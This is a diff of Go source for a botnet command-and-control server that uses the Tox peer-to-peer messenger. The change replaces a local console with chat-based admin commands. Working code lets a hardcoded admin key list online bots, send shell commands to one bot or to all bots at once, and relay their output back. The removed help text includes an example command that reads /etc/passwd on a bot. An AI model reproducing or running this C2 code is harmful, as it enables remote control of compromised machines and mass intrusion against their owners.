@@ -1,101 +1,25 @@
 package main
 
 import (
-	"bufio"
 	"fmt"
 	"io/ioutil"
-	"log"
-	"os"
 	"strconv"
 	"strings"
-
 	"time"
 
 	tox "github.com/TokTok/go-toxcore-c"
+	"golang.org/x/exp/slices"
 )
 
-// Tox bootstraps (nodes.tox.chat)
-var server = []interface{}{
-	"85.172.30.117", uint16(33445), "8E7D0B859922EF569298B4D261A8CCB5FEA14FB91ED412A7603A585A25698832",
-}
+// Admin public keys
+var admins = []string{"99C3111EC0A66672418FCFD9113DB6A1A0F5B54500461B2E8D5A6D4DF2071705"}
 
-var fname = "./server.data"
-var nickPrefix = "a"
-var statusinput = ""
-
-var fv []uint32 // Bots list
-
-var commandHistory []string
-
-// Color section
-var colorReset = "\033[0m"
-var colorRed = "\033[31m"
-var colorGreen = "\033[32m"
-var colorYellow = "\033[33m"
-var colorBlue = "\033[34m"
-var colorPurple = "\033[35m"
-var colorCyan = "\033[36m"
-var colorWhite = "\033[37m"
-var colorBlack = "\033[30m"
-var colorGrey = "\033[31m"
-
-// ListBots - Update fv or list bot information
-func Bots(t *tox.Tox, option string) []uint32 {
-
-	fv := t.SelfGetFriendList()
-
-	if option == "pull" {
-		return fv
-	} else {
-
-		for _, fno := range fv {
-			// Pull system information
-			bio, err := t.FriendGetStatusMessage(fno)
-			if err != nil {
-				panic(err)
-			}
-			// Get online status
-			status, err := t.FriendGetConnectionStatus(fno)
-			if err != nil {
-				panic(err)
-			}
-
-			if option == "all" {
-				if status == 0 {
-					fmt.Println("Offline:", fno, bio)
-				} else {
-					fmt.Println("Online:", fno, bio)
-				}
-			}
-
-			if option == "online" {
-				if status != 0 {
-					fmt.Println("Online:", fno, bio)
-				}
-			}
-
-			if option == "offline" {
-				if status == 0 {
-					fmt.Println("Offline:", fno, bio)
-				}
-			}
-
-		}
-		return nil
-	}
-}
-
-// SendMessage - Send string to friend number
-func SendMessage(t *tox.Tox, friendNumber uint32, message string) error {
-	_, err := t.FriendSendMessage(friendNumber, message)
-	if err != nil {
-		return err
-	}
-	return nil
-}
-
-// showC2 - Display a banner of the C2 Tox ID
 func showC2(toxid string, toxpub string) {
+
+	colorReset := "\033[0m"
+	colorRed := "\033[31m"
+	colorYellow := "\033[33m"
+	colorBlack := "\033[30m"
 
 	fmt.Println(string(colorYellow), `
 	 _____                 __       _   
@@ -113,34 +37,14 @@ func showC2(toxid string, toxpub string) {
 	fmt.Println("")
 }
 
-// helpCommands - Print commands with examples
-func helpCommands(help string) {
-	fmt.Println(string(colorPurple), "\n\tExamples:", help, string(colorReset))
-	if help == "" {
-		fmt.Println(string(colorYellow))
-		fmt.Println("\t\tbots - Displays examples for controlling bots")
-		fmt.Println("\t\tcommands - Display previous commands")
-		fmt.Println("\t\tclear - Clear the console")
-		fmt.Println(string(colorReset))
-	} else if help == "bots" {
-		fmt.Println(string(colorYellow))
-		fmt.Println("\t\tbots list all - List all bots")
-		fmt.Println("\t\tbots list amount - List total amount of bots")
-		fmt.Println("\t\tbots list online - List online bots")
-		fmt.Println("\t\tbots list offline - List offline bots")
-		fmt.Println("\t\tbots interact <id> cat /etc/passwd - Execute shell command")
-		// fmt.Println("\t\tbots interact * ! ls -lah - Mass execute") COMING SOON!
-		fmt.Println(string(colorReset))
-	}
-}
-
 func main() {
 
 	opt := tox.NewToxOptions()
+	fname := "./server.data"
 	if tox.FileExist(fname) {
 		data, err := ioutil.ReadFile(fname)
 		if err != nil {
-			log.Println(err)
+			fmt.Println(err)
 		} else {
 			opt.Savedata_data = data
 			opt.Savedata_type = tox.SAVEDATA_TYPE_TOX_SAVE
@@ -158,161 +62,147 @@ func main() {
 		}
 	}
 
+	// Tox bootstraps (nodes.tox.chat)
+	var server = []interface{}{
+		"85.172.30.117", uint16(33445), "8E7D0B859922EF569298B4D261A8CCB5FEA14FB91ED412A7603A585A25698832",
+	}
+
 	r, err := t.Bootstrap(server[0].(string), server[1].(uint16), server[2].(string))
 	r2, err := t.AddTcpRelay(server[0].(string), server[1].(uint16), server[2].(string))
 	if err != nil {
-		log.Println("bootstrap:", r, err, r2)
+		fmt.Println("bootstrap:", r, err, r2)
 	}
 
 	toxid := t.SelfGetAddress()
 	toxpub := t.SelfGetPublicKey()
 
-	defaultName := t.SelfGetName()
-	humanName := nickPrefix + toxid[0:5]
-	if humanName != defaultName {
-		t.SelfSetName(humanName)
-	}
-	humanName = t.SelfGetName()
-
-	defaultStatusinput, err := t.SelfGetStatusMessage()
-	if defaultStatusinput != statusinput {
-		t.SelfSetStatusMessage(statusinput)
-	}
-
 	err = t.WriteSavedata(fname)
 	if err != nil {
-		log.Println(err)
+		fmt.Println(err)
 	}
 
-	// Show C2 address
+	// Print C2 information
 	showC2(toxid, toxpub)
 
-	// Server load, pull all bots
-	fv = Bots(t, "pull")
-	fmt.Println(string(colorPurple))
-	fmt.Println("\tTotal bots:", len(fv))
-	fmt.Println(string(colorReset))
-
-	// Console for commands
-	go func() {
-
-		reader := bufio.NewReader(os.Stdin)
-
-		for {
-
-			fmt.Print(string(colorGreen), "\n-> ", string(colorReset), string(colorGrey))
-			input, _ := reader.ReadString('\n')
-			input = strings.Replace(input, "\n", "", -1)
-
-			// Append every input to the commands array
-			commandHistory = append(commandHistory, input)
-
-			// If input equals commands, print each command
-			if input == "commands" {
-				fmt.Println(string(colorPurple), "\n\n\tHistory:", string(colorReset))
-				for _, command := range commandHistory {
-					fmt.Println(string(colorYellow), "\t\t", command, string(colorReset))
-				}
+	// Auto accept all incoming friend requests
+	t.CallbackFriendRequest(
+		func(t *tox.Tox, friendId string, message string, userData interface{}) {
+			num, err := t.FriendAddNorequest(friendId)
+			if err != nil {
+				fmt.Println("on friend request:", num, err)
 			}
+			if num < 100000 {
+				t.WriteSavedata(fname)
+			}
+		},
+		nil,
+	)
 
-			fmt.Println(string(colorReset))
+	// C2 receives message
+	t.CallbackFriendMessage(
+		func(t *tox.Tox, friendNumber uint32, message string, userData interface{}) {
+			// Return public key from friend number
+			pub, err := t.FriendGetPublicKey(friendNumber)
+			if err != nil {
+				fmt.Println(err)
+			}
+			// Split received message
+			messages := strings.Fields(message)
+			// Check if sender is an admin
+			if slices.Contains(admins, pub) {
 
-			// If the command starts with bots
-			if strings.HasPrefix(input, "bots") {
-				// Split command
-				args := strings.Fields(input)
-
-				if len(args) >= 3 {
-
-					if args[1] == "list" {
-						if args[2] == "amount" {
-							// Pull all bots
-							fv = Bots(t, "pull")
-							fmt.Println(string(colorPurple))
-							fmt.Println("\tTotal bots:", len(fv))
-							fmt.Println(string(colorReset))
+				if strings.ToLower(messages[0]) == "help" {
+					_, err := t.FriendSendMessage(friendNumber, `
+				[+] HELP
+				[?] LIST - List online bots.
+				[?] EXEC <BOT> <CMD> - Execute command on bot.
+				[?] MASS <CMD> - Mass execute command.
+				`)
+					if err != nil {
+						fmt.Println(err)
+					}
+				} else if strings.ToLower(messages[0]) == "list" {
+					// Retrieve server friends list
+					fv := t.SelfGetFriendList()
+					// For each friend within list
+					for _, fno := range fv {
+						// If friend is an admin, skip iteration
+						if fno == friendNumber {
+							continue
 						}
-
-						// List online
-						if args[2] == "online" {
-							Bots(t, "online")
-						}
-						// List offline
-						if args[2] == "offline" {
-							Bots(t, "offline")
-						}
-						// List all
-						if args[2] == "all" {
-							Bots(t, "all")
-						}
-
-						// Execute shell command
-					} else if args[1] == "interact" {
-
-						fv = Bots(t, "pull")
-
-						// Convert ID to int
-						botid, err := strconv.Atoi(args[2])
+						// Get connection status (ONLINE, AWAY, BUSY, OFFLINE)
+						status, err := t.FriendGetConnectionStatus(fno)
 						if err != nil {
-							log.Println(err)
+							fmt.Println(err)
 						}
-
-						// If the bot ID is in the the bots list.
-						if botid < len(fv) {
-							// Send the command to the bot.
-							commands := args[3:]
-							command := strings.Join(commands, " ")
-							// Send shell command
-							err = SendMessage(t, fv[botid], "! "+command)
-
+						// If connection status isn't OFFLINE
+						if status != 0 {
+							// Send admin the online bot
+							_, err := t.FriendSendMessage(friendNumber, "ONLINE:"+strconv.FormatUint(uint64(fno), 10))
 							if err != nil {
-								fmt.Println("Bot offline...")
+								fmt.Println(err)
 							}
-
-						} else {
-							fmt.Println("Bot doesn't exist...")
 						}
 					}
+				} else if strings.ToLower(messages[0]) == "exec" {
+					// Convert string for bot to uint32
+					bot, err := strconv.ParseUint(messages[1], 10, 32)
+					if err != nil {
+						fmt.Println(err)
+					}
+					// Send public key of admin with command to execute on the bot
+					_, err = t.FriendSendMessage(uint32(bot), pub+" "+strings.Join(messages[2:], " "))
+					if err != nil {
+						fmt.Println(err)
+					}
 
-				} else {
-					// Not enough arguments: show examples
-					helpCommands("bots")
+				} else if strings.ToLower(messages[0]) == "mass" {
+
+					fv := t.SelfGetFriendList()
+
+					for _, fno := range fv {
+
+						if fno == friendNumber {
+							continue
+						}
+
+						status, err := t.FriendGetConnectionStatus(fno)
+						if err != nil {
+							fmt.Println(err)
+						}
+
+						if status != 0 {
+							_, err = t.FriendSendMessage(fno, pub+" "+strings.Join(messages[1:], " "))
+							if err != nil {
+								fmt.Println(err)
+							}
+						}
+					}
 				}
+			} else { // Output from bot
 
-			} else if input == "help" {
-				// Show help menu
-				helpCommands("")
-			} else if input == "clear" {
-				// Clear console
-				fmt.Print("\033[H\033[2J")
-				showC2(toxid, toxpub)
-			} else if input == "exit" {
-				// Exit
-				fmt.Println("\tGoodbye!")
-				os.Exit(1)
+				// Define public key attached to output
+				relayPub := messages[len(messages)-1]
+				// Define output
+				relayOut := messages[:len(messages)-1]
+
+				// Check if public key is admin
+				if slices.Contains(admins, relayPub) {
+					// Get friend number for admin
+					admin, err := t.FriendByPublicKey(relayPub)
+					if err != nil {
+						fmt.Println(err)
+					}
+					// Send the output from bot to the admin
+					_, err = t.FriendSendMessage(admin, strings.Join(relayOut, " "))
+					if err != nil {
+						fmt.Println(err)
+					}
+				}
 			}
-		}
-	}()
-
-	// Auto accept
-	t.CallbackFriendRequest(func(t *tox.Tox, friendId string, message string, userData interface{}) {
-
-		// When a bot adds the C2.
-		num, err := t.FriendAddNorequest(friendId)
-
-		if err != nil {
-			log.Println("on friend request:", num, err)
-		}
-		if num < 100000 {
-			t.WriteSavedata(fname)
-		}
-	}, nil)
-
-	// Shell output
-	t.CallbackFriendMessage(func(t *tox.Tox, friendNumber uint32, message string, userData interface{}) {
-		fmt.Print(string(colorYellow), "Output:", friendNumber, string(colorCyan), "\n\t\t", message)
-		fmt.Print(string(colorGreen), "-> ", string(colorRed))
-	}, nil)
+		},
+		nil,
+	)
 
 	// toxcore loops
 	shutdown := false
@@ -323,12 +213,9 @@ func main() {
 		if iv != itval {
 			itval = iv
 		}
-
 		t.Iterate()
 		loopc++
 		time.Sleep(1000 * 50 * time.Microsecond)
 	}
-
 	t.Kill()
-
 }
